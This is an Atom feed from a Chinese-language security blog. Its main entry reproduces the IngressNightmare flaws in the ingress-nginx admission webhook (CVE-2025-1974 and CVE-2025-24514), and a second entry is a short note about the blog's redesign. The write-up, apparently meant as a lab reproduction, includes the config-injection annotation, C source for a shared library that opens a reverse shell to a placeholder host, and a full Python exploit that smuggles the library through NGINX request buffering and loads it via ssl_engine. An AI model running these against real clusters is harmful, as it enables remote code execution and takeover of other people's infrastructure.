<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Xsheep</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-03-27T14:21:23.321Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Xsheep</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>IngressNightmare漏洞集群复现</title>
    <link href="http://example.com/2025/03/27/IngressNightmare%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2025/03/27/IngressNightmare%E5%A4%8D%E7%8E%B0/</id>
    <published>2025-03-27T14:21:44.451Z</published>
    <updated>2025-03-27T14:21:23.321Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CVE-2025-1974复现"><a href="#CVE-2025-1974复现" class="headerlink" title="CVE-2025-1974复现"></a>CVE-2025-1974复现</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>Ingress Nginx Controller 是 K8s 上最受欢迎的 Ingress 控制器之一，有权访问 ingress-nginx 准入控制器 webhook 的攻击者可以创建恶意的 ingress-nginx Ingress 配置，从而导致 RCE</p><h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>当Ingress Nginx Controller处理传入的 AdmissionReview请求时，它会根据模板文件和提供的 Ingress 对象生成一个临时 NGINX 配置文件。然后，它使用 <code>nginx -t</code>命令测试临时配置文件的有效性。</p><p>问题关键点有三个，谁可以发送AdmissionReview请求？，如何注入恶意NGINX配置文件？，如何利用nginx -t 命令执行rce？</p><p>对于第一个问题，通常，只有 Kubernetes API 服务器应该发送这些 AdmissionReview 请求。但是，由于 Admission Controller 缺少身份验证，因此具有最小网络访问权限的攻击者可以从集群内的任何 Pod 构建并发送任意 AdmissionReview 请求。</p><p>第二个问题，CVE-2025-1974漏洞是IngressNightmare漏洞集群中的一个，与其同时爆出的CVE-2025-24514，CVE-2025-1097，CVE-2025-1098皆为远程NGINX配置注入，可利用这三个漏洞实现注入任意 NGINX 配置指令。</p><p>第三个问题，Ingress Nginx Controller 中有许多可用的指令，<code>ssl_engine</code> 指令是 OpenSSL 模块的一部分，这个指令可以在配置文件中的任何位置使用，以在 NGINX 配置测试阶段加载任意库文件。此时出现第四个问题，如何上传恶意共享库文件？</p><p>如果 HTTP 请求正文大小大于特定阈值（默认为8KB）时，NGINX 有时会将请求体保存到临时文件中，将请求中的标头设置为大于实际内容大小。NGINX 会一直等待发送更多数据，这会导致进程挂起，让文件描述符打开的时间更长，通过遍历爆破 PID 和 FD 编号，找到文件描述符，对恶意共享库进行加载。</p><h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><p>ingress-nginx&#x2F;internal&#x2F;ingress&#x2F;controller&#x2F;controller.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">content, err := n.generateTemplate(cfg, *pcfg)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">n.metricCollector.IncCheckErrorCount(ing.ObjectMeta.Namespace, ing.Name)</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = n.testTemplate(content)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">n.metricCollector.IncCheckErrorCount(ing.ObjectMeta.Namespace, ing.Name)</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>generateTemplate函数生成cfg文件，testTemplate函数进行配置测试</p><p>testTemplate函数如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(n *NGINXController)</span></span> testTemplate(cfg []<span class="type">byte</span>) <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(cfg) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;invalid NGINX configuration (empty)&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">tmpfile, err := os.CreateTemp(filepath.Join(os.TempDir(), <span class="string">&quot;nginx&quot;</span>), tempNginxPattern)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> tmpfile.Close()</span><br><span class="line">err = os.WriteFile(tmpfile.Name(), cfg, file.ReadWriteByUser)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">out, err := n.command.Test(tmpfile.Name())</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// this error is different from the rest because it must be clear why nginx is not working</span></span><br><span class="line">oe := fmt.Sprintf(<span class="string">`</span></span><br><span class="line"><span class="string">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">Error: %v</span></span><br><span class="line"><span class="string">%v</span></span><br><span class="line"><span class="string">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">`</span>, err, <span class="type">string</span>(out))</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> errors.New(oe)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">os.Remove(tmpfile.Name())</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在testTemplate函数调用Test函数，Test函数代码如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(nc NginxCommand)</span></span> Test(cfg <span class="type">string</span>) ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="comment">//nolint:gosec // Ignore G204 error</span></span><br><span class="line"><span class="keyword">return</span> exec.Command(nc.Binary, <span class="string">&quot;-c&quot;</span>, cfg, <span class="string">&quot;-t&quot;</span>).CombinedOutput()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>使用minikube搭建环境</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64</span><br><span class="line"></span><br><span class="line">sudo install minikube-linux-amd64 /usr/local/bin/minikube</span><br></pre></td></tr></table></figure><p>启动minickube (在这里可能会出现很多报错，可根据具体原因解决，此处省略)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">minikube start</span><br></pre></td></tr></table></figure><p>安装受漏洞影响版本的ingress-nignx</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.11.2/deploy/static/provider/cloud/deploy.yaml</span><br><span class="line"></span><br><span class="line">#下面两条命令用于换源</span><br><span class="line">sed -i &#x27;s#registry.k8s.io/ingress-nginx/controller:v1.11.2@sha256:d5f8217feeac4887cb1ed21f27c2674e58be06bd8f5184cacea2a69abaf78dce#registry.aliyuncs.com/google_containers/nginx-ingress-controller:v1.11.2#g&#x27; deploy.yaml</span><br><span class="line"> </span><br><span class="line">sed -i &#x27;s#registry.k8s.io/ingress-nginx/kube-webhook-certgen:v1.4.3@sha256:a320a50cc91bd15fd2d6fa6de58bd98c1bd64b9a6f926ce23a600d87043455a3#registry.aliyuncs.com/google_containers/kube-webhook-certgen:v1.4.3#g&#x27; deploy.yaml</span><br><span class="line"></span><br><span class="line"># 安装</span><br><span class="line">kubectl apply -f deploy.yaml</span><br></pre></td></tr></table></figure><p>一般情况下启动的validating webhook监听在8443端口 ，用putforward命令进行端口转发</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl port-forward -n ingress-nginx ingress-nginx-controller-76c86b6bbd-s86qn 2333:8443</span><br></pre></td></tr></table></figure><p>使用网上的Poc进行验证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gir clone https://github.com/sandumjacob/IngressNightmare-POCs</span><br><span class="line">cd ./CVE-2025-1974</span><br><span class="line">curl --insecure -v -H &quot;Content-Type: application/json&quot; --data @poc.json https://localhost:2333/123</span><br></pre></td></tr></table></figure><p>查看日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl logs ingress-nginx-controller-76c86b6bbd-s86qn -n ingress-nginx</span><br></pre></td></tr></table></figure><p>出现以下语句，说明验证了上传的nginx配置，即存在漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I0326 02:53:15.823881       7 main.go:107] &quot;successfully validated configuration, accepting&quot; ingress=&quot;/&quot;</span><br></pre></td></tr></table></figure><p>进行深一步利用需搭配IngressNightmare的其余漏洞，攻击分三步实现RCE：上传恶意.so文件至Pod临时存储；通过Content-Length标头维持文件描述符；注入ssl_engine指令加载恶意库。</p><h3 id="进一步利用"><a href="#进一步利用" class="headerlink" title="进一步利用"></a>进一步利用</h3><p>通过 CVE-2025-24514 + CVE-2025-1974 实现RCE</p><p>当我们在auth-url annotation处配置如下时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx.ingress.kubernetes.io/auth-url: &quot;http://example.com/#;\ninjection_point&quot; </span><br></pre></td></tr></table></figure><p>由于注释符的原因，\n会被解析为回车，于是配置文件中会显示为如下格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">... </span><br><span class="line">proxy_http_version 1.1; </span><br><span class="line">set $target http://example.com/#; </span><br><span class="line">injection_point </span><br><span class="line">proxy_pass $target; </span><br><span class="line">... </span><br></pre></td></tr></table></figure><p>如果我们将上面的injection_point替换为<code>ssl_engine</code>指令，即可在测试配置文件时加载恶意库<br>编写恶意库文件，用于反弹shell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__attribute__((constructor)) <span class="type">static</span> <span class="type">void</span> <span class="title function_">reverse_shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *server_ip=<span class="string">&quot;xx.xx.xx.xx&quot;</span>;</span><br><span class="line">    <span class="type">uint32_t</span> server_port=<span class="number">6666</span>;</span><br><span class="line">    <span class="type">int</span> sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">attacker_addr</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    attacker_addr.sin_family = AF_INET;</span><br><span class="line">    attacker_addr.sin_port = htons(server_port);</span><br><span class="line">    attacker_addr.sin_addr.s_addr = inet_addr(server_ip);</span><br><span class="line">    <span class="keyword">if</span>(connect(sock, (<span class="keyword">struct</span> sockaddr *)&amp;attacker_addr,<span class="keyword">sizeof</span>(attacker_addr))!=<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    dup2(sock, <span class="number">0</span>);</span><br><span class="line">    dup2(sock, <span class="number">1</span>);</span><br><span class="line">    dup2(sock, <span class="number">2</span>);</span><br><span class="line">    <span class="type">char</span> *args[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>, args, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC shell.c -o shell.so</span><br></pre></td></tr></table></figure><p>接下来就是利用nginx的客户端缓冲机制暂存shell文件，并且遍历进程pid和fd触发加载</p><p>exp如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># 此处注意，由于是本地验证 我执行了以下两条命令进行端口转发</span><br><span class="line">#kubectl port-forward -n ingress-nginx svc/ingress-nginx-controller-admission 2333:8443 &amp;</span><br><span class="line">#kubectl port-forward -n ingress-nginx svc/ingress-nginx-controller 2888:80 &amp;</span><br><span class="line"></span><br><span class="line">admission_url = &#x27;https://localhost:2333/123&#x27;</span><br><span class="line">url = &#x27;http://localhost:2888&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;apiVersion&quot;: &quot;admission.k8s.io/v1&quot;,</span><br><span class="line">  &quot;kind&quot;: &quot;AdmissionReview&quot;,</span><br><span class="line">  &quot;request&quot;: &#123;</span><br><span class="line">    &quot;kind&quot;: &#123;</span><br><span class="line">      &quot;group&quot;: &quot;networking.k8s.io&quot;,</span><br><span class="line">      &quot;version&quot;: &quot;v1&quot;,</span><br><span class="line">      &quot;kind&quot;: &quot;Ingress&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;resource&quot;: &#123;</span><br><span class="line">      &quot;group&quot;: &quot;&quot;,</span><br><span class="line">      &quot;version&quot;: &quot;v1&quot;,</span><br><span class="line">      &quot;resource&quot;: &quot;namespaces&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;operation&quot;: &quot;CREATE&quot;,</span><br><span class="line">    &quot;object&quot;: &#123;</span><br><span class="line">      &quot;metadata&quot;: &#123;</span><br><span class="line">        &quot;name&quot;: &quot;deads&quot;,</span><br><span class="line">        &quot;annotations&quot;: &#123;</span><br><span class="line">            &quot;nginx.ingress.kubernetes.io/auth-url&quot;: &quot;injection&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;spec&quot;: &#123;</span><br><span class="line">        &quot;rules&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;host&quot;: &quot;jacobsandum.com&quot;,</span><br><span class="line">            &quot;http&quot;: &#123;</span><br><span class="line">            &quot;paths&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                &quot;path&quot;: &quot;/&quot;,</span><br><span class="line">                &quot;pathType&quot;: &quot;Prefix&quot;,</span><br><span class="line">                &quot;backend&quot;: &#123;</span><br><span class="line">                    &quot;service&quot;: &#123;</span><br><span class="line">                    &quot;name&quot;: &quot;kubernetes&quot;,</span><br><span class="line">                    &quot;port&quot;: &#123;</span><br><span class="line">                        &quot;number&quot;: 80</span><br><span class="line">                    &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ],</span><br><span class="line">        &quot;ingressClassName&quot;: &quot;nginx&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">with open(&quot;poc.json&quot;, &quot;r&quot;) as f:</span><br><span class="line">    data = json.load(f)</span><br><span class="line"></span><br><span class="line">with open(&quot;shell.so&quot;, &quot;rb&quot;) as f:</span><br><span class="line">    shellcode = f.read()</span><br><span class="line"></span><br><span class="line">def upload():</span><br><span class="line">    real_lenth = len(shellcode)</span><br><span class="line">    fake_lenth = real_lenth + 20</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        headers = &#123;</span><br><span class="line">            &quot;Content-length&quot;: str(fake_lenth),</span><br><span class="line">            &quot;Content-Type&quot;: &quot;application/octet-stream&quot;,</span><br><span class="line">            &quot;Connection&quot;: &quot;keep-alive&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url, headers=headers,data= shellcode)</span><br><span class="line">        print(&quot;[+]upload success&quot;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;[!]upload failed\n&quot;)</span><br><span class="line">        print(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def testing_to_load():</span><br><span class="line">    for pid in range(0,41):</span><br><span class="line">        for fd in range(0,41):</span><br><span class="line">            path_test = f&#x27;/proc/&#123;pid&#125;/fd/&#123;fd&#125;&#x27;</span><br><span class="line">            data[&quot;request&quot;][&quot;object&quot;][&quot;metadata&quot;][&quot;annotations&quot;][</span><br><span class="line">                &quot;nginx.ingress.kubernetes.io /&quot;</span><br><span class="line">            ] = &quot;http://example.com/#;&#125;&#125;&#125;\\n\\nssl_engine %s;\\n\\n&quot; % (path_test,)</span><br><span class="line"></span><br><span class="line">            try:</span><br><span class="line">                res = requests.post(admission_url, json=data, verify=False)</span><br><span class="line">                print(&quot;[+]testing&quot; + &quot; &quot; + path_test)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                print(&quot;[!]&quot; + &quot; error parsing response&quot;)</span><br><span class="line">                print(e)</span><br><span class="line"></span><br><span class="line">upload()</span><br><span class="line">testing_to_load()</span><br></pre></td></tr></table></figure><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Ingress NGINX Controller 版本&lt; 1.12.1</p><p>Ingress NGINX Controller 版本&lt; 1.11.5</p><p>Ingress NGINX Controller 版本&lt; 1.10.7</p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>这些漏洞已在 Ingress NGINX Controller 的 1.12.1、1.11.5 和 1.10.7 版本中得到修复。建议用户尽快更新到最新版本，并确保准入 Webhook 端点不会对外暴露</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CVE-2025-1974复现&quot;&gt;&lt;a href=&quot;#CVE-2025-1974复现&quot; class=&quot;headerlink&quot; title=&quot;CVE-2025-1974复现&quot;&gt;&lt;/a&gt;CVE-2025-1974复现&lt;/h2&gt;&lt;h3 id=&quot;漏洞简介&quot;&gt;&lt;a href</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>HelloWorld</title>
    <link href="http://example.com/2025/01/01/java_sec/"/>
    <id>http://example.com/2025/01/01/java_sec/</id>
    <published>2025-01-01T13:50:45.859Z</published>
    <updated>2025-01-01T15:42:55.791Z</updated>
    
    <content type="html"><![CDATA[<p>2025年1月1日改版博客，决定写一些真正有思考的东西，至少要让自己看的下去。<br>博客基于Hexo搭建，主题是cactus,个人改版了一下，修改了页面宽度和字体大小。<br>hexo主题的通病就是页面有点窄，字体有点小（也有可能是我没设置好），对眼睛不是很友好，我喜欢大一点的字。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;2025年1月1日改版博客，决定写一些真正有思考的东西，至少要让自己看的下去。&lt;br&gt;博客基于Hexo搭建，主题是cactus,个人改版了一下，修改了页面宽度和字体大小。&lt;br&gt;hexo主题的通病就是页面有点窄，字体有点小（也有可能是我没设置好），对眼睛不是很友好，我喜欢大</summary>
      
    
    
    
    <category term="心得与体会" scheme="http://example.com/categories/%E5%BF%83%E5%BE%97%E4%B8%8E%E4%BD%93%E4%BC%9A/"/>
    
    
  </entry>
  
</feed>
